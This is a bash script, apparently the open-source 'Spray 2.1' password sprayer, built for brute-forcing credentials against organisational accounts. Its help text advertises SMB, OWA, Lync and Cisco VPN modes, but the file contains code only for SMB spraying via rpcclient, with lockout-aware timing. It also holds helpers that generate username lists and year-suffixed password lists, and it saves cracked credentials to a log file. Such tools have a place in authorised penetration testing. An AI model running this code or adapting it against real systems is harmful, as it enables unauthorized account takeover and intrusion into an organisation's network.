#!/bin/bash

echo -e "\nSpray 2.1 the Password Sprayer by Jacob Wilkin(Greenwolf)\n"

if [ $# -eq 0 ] || [ "$1" == "-help" ] || [ "$1" == "-h" ] || [ "$1" == "--help" ] ; then
    echo "This script will password spray a target over a period of time"
    echo "It requires password policy as input so accounts are not locked out"
    echo "Useage: spray.sh -smb <targetIP> <usernameList> <passwordList> <AttemptsPerLockoutPeriod> <LockoutPeriodInMinutes> <Domain>"
    echo -e "Example: spray.sh -smb 192.168.0.1 users.txt passwords.txt 1 35 CORPORATION\n"

    echo "To password spray an OWA portal, a file must be created of the POST request with Username: sprayuser@domain.com, and Password: spraypassword"
    echo "Useage: spray.sh -owa <targetIP> <usernameList> <passwordList> <AttemptsPerLockoutPeriod> <LockoutPeriodInMinutes> <RequestFile>"
    echo -e "Example: spray.sh -owa 192.168.0.1 usernames.txt passwords.txt 1 35 post-request.txt\n"

    echo "To password spray an lync service, a lync autodiscover url or a url that returns the www-authenticate header must be provided along with a list of email addresses"
    echo "Useage: spray.sh -lync <lyncDiscoverOrAutodiscoverUrl> <emailAddressList> <passwordList> <AttemptsPerLockoutPeriod> <LockoutPeriodInMinutes>"
    echo "Example: spray.sh -lync https://lyncdiscover.company.com/ emails.txt passwords.txt 1 35\n"
    echo -e "Example: spray.sh -lync https://lyncweb.company.com/Autodiscover/AutodiscoverService.svc/root/oauth/user emails.txt passwords.txt 1 35\n"

    echo "To password spray an CISCO Web VPN a target portal or server hosting a portal must be provided"
    echo "Useage: spray.sh -cisco <targetURL> <usernameList> <passwordList> <AttemptsPerLockoutPeriod> <LockoutPeriodInMinutes>"
    echo -e "Example: spray.sh -cicso 192.168.0.1 usernames.txt passwords.txt 1 35\n"

    echo -e "\nIt is also possible to update the supplied 2016/2017 password list to the current year"
    echo "Useage: spray.sh -passupdate <passwordList>"
    echo "Example: spray.sh -passupdate passwords.txt"
    echo -e "\nAn optional company name can also be provided to add to the list:"
    echo "Useage: spray.sh -passupdate <passwordList> <CompanyName>"
    echo "Example: spray.sh -passupdate passwords.txt Company"

    echo -e "\nA username list can also be generated from a list of common names:"
    echo "Useage: spray.sh -genusers <firstnames> <lastnames> \"<<fi><li><fn><ln>>\""
    echo "Example: spray.sh -genusers english-first-1000.txt english-last-1000.txt \"<fi><ln>\""
    echo "Example: spray.sh -genusers english-first-1000.txt english-last-1000.txt \"<fn>.<ln>\""

    echo ""
    exit 0
fi

if [ "$1" == "-passupdate" ] || [ "$1" == "--passupdate" ] || [ "$1" == "passupdate" ] ; then

    if [ $# -eq 3 ] ; then 
        touch temp-passwords.txt
        echo "$31" >> temp-passwords.txt
        echo "$316" >> temp-passwords.txt
        echo "$317" >> temp-passwords.txt
        echo "$32016" >> temp-passwords.txt
        echo "$32017" >> temp-passwords.txt
        cat $2 >> temp-passwords.txt
        rm $2
        mv temp-passwords.txt $2
    fi

    echo -n "Updating Password List... "
    longdate1=$(date +%Y)
    longdate2=$(($longdate1-1))
    shortdate1=$(date +%y)
    if [ "$shortdate1" == "00" ] ; then
    	shortdate2="99"
    else
    	shortdate2=$(($shortdate1-1))
    fi
    
    #sed -i.bak s/2017/$longdate1/g $2

    #sed -i.bak s/2016/$longdate2/g $2
    sed -i.bak s/17/$shortdate1/g $2
    sed -i.bak s/16/$shortdate2/g $2
    echo "Complete"
    exit 0
fi

if [ "$1" == "-genusers" ] || [ "$1" == "--genusers" ] || [ "$1" == "genusers" ] ; then
    #spray.sh -genusers <firstnames> <lastnames> "<UsernameFormat>""
    touch generated-usernames.tmp
    echo "Generating Username list..."
    for firstname in $(cat $2); do 
        for lastname in $(cat $3); do 
            fi=${firstname:0:1}
            li=${lastname:0:1}
            echo "$4" | sed "s/<fi>/$fi/" | sed "s/<li>/$li/" | sed "s/<fn>/$firstname/" | sed "s/<ln>/$lastname/" >> generated-usernames.tmp
        done
    done
    cat generated-usernames.tmp | sort -u > generated-usernames.txt
    rm generated-usernames.tmp
    echo -e "Username list generated in generated-usernames.txt\n"
    exit 0
fi

if [ "$1" == "-calc-throttle" ] || [ "$1" == "--calc-throttle" ] || [ "$1" == "calc-throttle" ] ; then
    numusers=$(cat $2 | wc -l | sed 's/ //g')
    lockouttime=$3
    throttletime=$(($lockouttime*60*10000/$numusers))
    echo "To spray $numusers users over $lockouttime minutes,"
    echo "Intruder Throttle(milliseconds) should be: $throttletime"
    echo "Threads should be: 1"
    exit 0
fi

if [ $# -lt 5 ] ; then
    echo "Not Enough Arguments"
    echo "Useage: spray.sh <targetIP> <usernameList> <passwordList> <LockoutThreshold> <LockoutResetTimerInMinutes>"
    echo -e "Example: spray.sh 192.168.0.1 users.txt passwords.txt 4 30\n"
    exit 0
fi


#Internal Network SMB Spraying Code
if [ "$1" == "-smb" ] || [ "$1" == "--smb" ] || [ "$1" == "smb" ] ; then
    mkdir -p logs
    set +H
    domain=$7
    target=$2
    cp $3 logs/username-removed-successes.txt
    userslist="logs/username-removed-successes.txt"
    passwordlist=$4
    lockout=$5
    lockoutduration=$(($6 * 60))
    counter=0
    touch logs/spray-logs.txt

    #Initial spray for same username as password
    time=$(date +%H:%M:%S)
    cat logs/spray-logs.txt | grep -v "Cannot"
    counter=$(($counter + 1))
    if [ $counter -eq $lockout ] ; then
    	counter=0
    	sleep $lockoutduration
    fi
            
            
    #Then start on list
    for password in $(cat $passwordlist); do
        time=$(date +%H:%M:%S)
    	for u in $(cat $userslist); do 
            (echo "$time : Spraying user: $u with password: $password")
            (echo -n "[*] user $u%$password " && rpcclient -U "$domain/$u%$password" -c "getusername;quit" $target) >> logs/spray-logs.txt
            sleep 1
    	done
        cat logs/spray-logs.txt | grep -v "Cannot"
        cat logs/spray-logs.txt | grep -v "Cannot" | cut -d ' ' -f 3 | cut -d '%' -f 1 | sort -u > logs/usernamestoremove.txt
        cat logs/spray-logs.txt | grep -v "Cannot" | cut -d ' ' -f 3 | sort -u > logs/credentials.txt
        for user in $(cat logs/usernamestoremove.txt); do 
            sed -i.bak "/$user/d" $userslist
        done
        rm logs/usernamestoremove.txt
    	counter=$(($counter + 1))
    	if [ $counter -eq $lockout ] ; then
    		counter=0
    		sleep $lockoutduration
    	fi
    done
    exit 0
fi
